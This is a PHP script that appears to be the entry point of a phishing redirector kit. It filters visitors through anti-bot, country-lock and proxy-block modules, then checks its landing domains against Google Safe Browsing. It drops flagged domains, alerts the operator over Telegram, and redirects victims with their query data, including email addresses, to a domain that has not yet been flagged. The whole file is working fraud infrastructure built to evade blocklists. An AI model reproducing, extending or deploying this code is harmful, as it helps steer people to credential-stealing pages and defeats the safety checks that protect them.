<?php

error_reporting(0);
session_start();

$remoteip = 
  isset($_SERVER["HTTP_CF_CONNECTING_IP"])?
     $_SERVER["HTTP_CF_CONNECTING_IP"]:
     $_SERVER["REMOTE_ADDR"]
  ;

$redi_bot = base64_encode(time().sha1($remoteip.$_SERVER['HTTP_USER_AGENT']).md5(uniqid(rand(), true)));

$_SESSION['redi_watch'] = $redi_bot;

require('config.php');
require('fakesites.php');

if ($fuck2 == 'products'){
     header('HTTP/1.0 403 Forbidden');
     die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>Error Fuck</title></head><body><h1>Incomplete setup  </h1><p></p><p> Please go to config.php and change fuck2 to unique url or variable do same with script.txt, also change TELEGRAM_BOT_ADMIN_USERID and TELEGRAM_BOT_TOKEN  to your own ID </p></body></html>');
};


// plugin imports start 


require_once('accesscount.php');
require_once('antibotpw.php');
require_once('killbot/code/include.php');

if ($emailaccess_only == true){
    require_once('emailaccess.php');
    
}
if ($crawler_bot == true){
    require_once('crawler.php');
}

if ($country_lock == true){
    require_once('countrylock.php');
}

if ($proxy_block == true){
    require_once('proxycheck.php');
}




$_GET[$fuck1] = ($fuck2); //fuck everything ;



if (trim(file_get_contents($url_file)) == false) {
	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
    
}

//there is this function created i should use but am lazy as fuck , you agree with me i did a very dirty work here

# Avoiding API Check And Using The Regular Script Money Bitch :)

foreach (file($url_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $domain) {
	$url =
        'https://www.google.com/transparencyreport/api/v3/safebrowsing/status?site=' .
        $domain;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 7);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    $check = curl_exec($ch);
    curl_close($ch);
    if (
        strstr($check, '[["sb.ssr",6,') or
        strstr($check, '[["sb.ssr",1,') or
        strstr($check, '[["sb.ssr",4,')
    ) {
        $domains = array($domain);
        break;
    }
    else{
        file_get_contents("https://api.telegram.org/bot".$telegram_bot_token."/sendMessage?chat_id=".$telegram_user_id."&text=This page is Bad , Please replace   ".$domain."&parse_mode=Markdown&disable_web_page_preview=True");
            $content = file_get_contents($url_file);
            $content = str_replace($domain, '', $content);
            file_put_contents($url_file, $content);
            
        
    }
    
}




$query = null;

if ($_GET !== []) {
    foreach ($_GET as $key) {
        if ($key === $fuck1) continue;
		}
		$query = http_build_query($_GET);
		$query = '?' . str_replace(['%40'], ['@'], $query);
	}
	
	
header('Location: ' .$domains[0] .$query);
exit();
    


//Dirty Work ends here





?>

